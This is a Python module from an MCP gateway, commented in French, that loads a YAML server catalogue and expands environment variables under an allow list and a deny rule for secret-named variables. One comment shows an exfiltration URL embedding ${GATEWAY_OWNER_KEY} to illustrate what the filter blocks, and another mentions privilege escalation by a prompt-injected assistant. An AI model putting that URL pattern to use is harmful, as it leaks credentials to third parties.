from __future__ import annotations

import logging
import os
import re
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

import yaml

from mcp_gateway.config import settings, utilisateur_du_pod

log = logging.getLogger(__name__)


@dataclass
class ServerSpec:
    id: str
    name: str
    description: str
    url: str
    transport: str
    prefix: str
    auth_env: str | None = None
    auth_hint: str = ""
    # Où l'utilisateur trouve la clé de ce service. C'est le seul renseignement
    # qu'il ne peut pas déduire de l'écran, et il dépend du service : il
    # appartient donc au catalogue, pas au code de l'interface.
    key_location: str = ""
    auth_required: bool = False
    url_editable: bool = False


@dataclass
class BundleSpec:
    id: str
    label: str
    # Ce que l'utilisateur lit a l'ecran.
    description: str
    servers: list[str]
    # Ce que le modele recoit dans InitializeResult.instructions. Vide pour un
    # profil qui n'en distingue pas : c'est alors la description qui sert.
    mcp_instructions: str = ""
    meta_tools: list[str] | None = None
    registry_servers: list[str] | None = None
    audience: str = "catalog"  # catalog | advanced
    # full     : tous les outils dans tools/list (défaut, comportement historique)
    # discover : seuls méta-outils et compositions ; le reste via gateway_find_tools
    tool_exposure: str = "full"


@dataclass
class Catalog:
    version: int
    enforce_envelope: bool
    default_bundle: str
    mcp_default_bundle: str
    bundles: dict[str, BundleSpec]
    servers: dict[str, ServerSpec]
    # Le plafond de privilège d'une session MCP. Un client peut se restreindre
    # en deçà, jamais s'élever au-dessus : sans cela, gateway_use_bundle est une
    # élévation en un appel, offerte à quiconque tient un jeton — y compris à
    # un assistant sous injection de prompt. Vide : le plafond est le preset par
    # défaut des sessions MCP.
    mcp_ceiling: str = ""
    grist_sync: dict[str, Any] = field(default_factory=dict)
    # Qui publie ce catalogue. L'interface lit ces libellés plutôt que de porter
    # un nom d'organisation en dur : remplacer le fichier suffit à renommer
    # partout. Vide pour un catalogue qui ne se réclame de personne.
    organisation: dict[str, Any] = field(default_factory=dict)


_VAR_RE = re.compile(r"\$\{([A-Za-z_][A-Za-z0-9_]*)\}")


# Un catalogue peut venir d'ailleurs — fichier monté, dépôt distant tiré par
# catalog_sync. Substituer n'importe quelle variable d'environnement y ferait
# une exfiltration en une ligne : « url: https://ailleurs/${GATEWAY_OWNER_KEY}/mcp »
# est affiché tel quel par l'API, et surtout appelé par le pool au démarrage —
# le secret part alors dans le journal d'accès d'un tiers. On ne substitue donc
# que ce qui décrit *où* l'on tourne, jamais ce qui ouvre une porte.
VARIABLES_PERMISES = frozenset(
    {
        "ONYXIA_USER",
        "TENANT",
        "K8S_NAMESPACE",
        "NAMESPACE",
        "KUBERNETES_NAMESPACE",
        "USER",
        "USERNAME",
    }
)

_SUFFIXES_SECRETS = ("_KEY", "_TOKEN", "_SECRET", "_BEARER", "_PASSWORD")


def variable_permise(nom: str) -> bool:
    if nom in VARIABLES_PERMISES:
        return True
    if nom.startswith("GATEWAY_"):
        return False
    return not nom.endswith(_SUFFIXES_SECRETS)


def _expand(text: str) -> str:
    """Substitue les `${VARIABLE}` du catalogue par l'environnement.

    `${ONYXIA_USER}` reste résolu même sans variable d'environnement, via le
    réglage dédié. Les autres viennent de l'environnement : le même catalogue
    est ainsi utilisable hors SSPCloud (`${TENANT}`, `${K8S_NAMESPACE}`…) sans
    toucher au code.

    Une variable absente donne une chaîne vide, comme auparavant : c'est
    `validate_catalog` qui signale les URLs non résolues. Laisser le `${...}`
    visible produirait des URLs syntaxiquement invalides, dont les échecs de
    sondage sont plus difficiles à interpréter qu'un hôte tronqué.
    """

    def _replace(match: re.Match[str]) -> str:
        name = match.group(1)
        if name == "ONYXIA_USER":
            return (
                settings.onyxia_user
                or os.environ.get("ONYXIA_USER", "")
                # Dernier recours : le namespace du pod. Onyxia ne pose pas
                # ONYXIA_USER de lui-même, donc une installation en ligne de
                # commande n'a que cela pour résoudre les URL du catalogue.
                or utilisateur_du_pod()
            )
        if not variable_permise(name):
            log.warning(
                "Catalogue : ${%s} n'est pas substituée — variable hors liste permise.",
                name,
            )
            return ""
        return os.environ.get(name, "")

    return _VAR_RE.sub(_replace, text)


def _catalog_from_raw(raw: dict[str, Any]) -> Catalog:
    servers = {}
    for sid, spec in raw.get("servers", {}).items():
        servers[sid] = ServerSpec(
            id=sid,
            name=spec["name"],
            description=spec.get("description", ""),
            url=_expand(spec["url"]),
            transport=spec.get("transport", "streamable-http"),
            prefix=spec.get("prefix", sid),
            auth_env=spec.get("auth_env"),
            auth_hint=spec.get("auth_hint", ""),
            key_location=spec.get("key_location", ""),
            auth_required=bool(spec.get("auth_required", False)),
            url_editable=bool(spec.get("url_editable", False)),
        )

    bundles = {}
    for bid, spec in raw.get("bundles", {}).items():
        reg = spec.get("registry_servers")
        audience = str(spec.get("audience") or "catalog").strip().lower()
        if audience not in {"catalog", "advanced"}:
            audience = "catalog"
        bundles[bid] = BundleSpec(
            id=bid,
            label=spec.get("label", bid),
            description=spec.get("description", ""),
            mcp_instructions=spec.get("mcp_instructions", ""),
            servers=list(spec.get("servers", [])),
            meta_tools=spec.get("meta_tools"),
            registry_servers=list(reg) if reg else None,
            audience=audience,
            tool_exposure=str(spec.get("tool_exposure") or "full"),
        )

    mcp_default = raw.get("mcp_default_bundle", raw.get("default_bundle", "tout"))
    if settings.mcp_default_bundle:
        mcp_default = settings.mcp_default_bundle

    return Catalog(
        version=int(raw.get("version", 1)),
        enforce_envelope=bool(raw.get("enforce_envelope", False)),
        default_bundle=raw.get("default_bundle", "tout"),
        mcp_default_bundle=mcp_default,
        mcp_ceiling=str(raw.get("mcp_ceiling") or ""),
        bundles=bundles,
        servers=servers,
        grist_sync=dict(raw.get("grist_sync") or {}),
        organisation=dict(raw.get("organisation") or {}),
    )


def load_catalog(path: Path | None = None) -> Catalog:
    p = path or settings.catalog_path
    raw = yaml.safe_load(p.read_text(encoding="utf-8"))
    return _catalog_from_raw(raw)


def load_catalog_text(text: str) -> Catalog:
    raw = yaml.safe_load(text)
    if not isinstance(raw, dict):
        raise ValueError("YAML catalogue invalide : objet racine attendu")
    return _catalog_from_raw(raw)


def validate_catalog(catalog: Catalog) -> list[str]:
    errors: list[str] = []
    for bid, bundle in catalog.bundles.items():
        for sid in bundle.servers:
            if sid not in catalog.servers:
                errors.append(f"bundle '{bid}' references unknown server '{sid}'")
    if catalog.default_bundle not in catalog.bundles:
        errors.append(f"default_bundle '{catalog.default_bundle}' not defined")
    if catalog.mcp_default_bundle not in catalog.bundles:
        errors.append(f"mcp_default_bundle '{catalog.mcp_default_bundle}' not defined")
    if catalog.mcp_ceiling and catalog.mcp_ceiling not in catalog.bundles:
        errors.append(f"mcp_ceiling '{catalog.mcp_ceiling}' not defined")
    for sid, srv in catalog.servers.items():
        if "${ONYXIA_USER}" in srv.url or not re.search(r"https?://", srv.url):
            if not settings.onyxia_user and not os.environ.get("ONYXIA_USER"):
                errors.append(f"server '{sid}': set ONYXIA_USER for URL expansion")
    return errors
